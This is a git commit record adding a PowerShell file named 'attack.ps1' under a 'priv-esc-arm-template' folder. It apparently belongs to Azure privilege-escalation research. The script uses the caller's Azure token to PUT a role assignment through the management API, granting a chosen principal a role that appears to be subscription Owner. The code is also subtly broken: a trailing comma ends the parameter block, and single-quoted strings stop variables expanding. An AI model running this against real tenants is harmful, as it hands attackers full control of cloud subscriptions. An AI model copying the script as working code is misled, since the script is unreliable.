739d0520918b0ee165b6ebcaccb1aeeee9c082aa
Rogier Dijkman <40334679+azurekid@users.noreply.github.com>
2023-06-29 16:08:03 +0200

    added template for managed identity

---
+++ priv-esc-arm-template/attack.ps1
@@ -0,0 +1,24 @@
+[CmdletBinding()]
+param (
+    [Parameter()]
+    [string]$subscriptionId,
+
+    [Parameter()]
+    [string]$principalId,
+
+    [Parameter()]
+    [string]$roleDefinition = '8e3af657-a8ff-443c-a75c-2fe8c4bcb635',
+
+    [Parameter()]
+    [string]$guid,
+)
+
+$token = (Get-AzAccessToken).token
+$headers = @{"Authorization"="Bearer $token"}
+$payload = '{"properties": {"roleDefinitionId": "/subscriptions/$subscriptionId/providers/Microsoft.Authorization/roleDefinitions/$roleDefinition","principalId": "$principalId","principalType": "User"}}'
+
+Invoke-RestMethod -Uri 'https://management.azure.com/subscriptions/$subscriptionId/providers/Microsoft.Authorization/roleAssignments/$guid?api-version=2022-04-01' `
+  -Headers $headers `
+  -Body $payload `
+  -ContentType 'application/json' `
+  -Method PUT
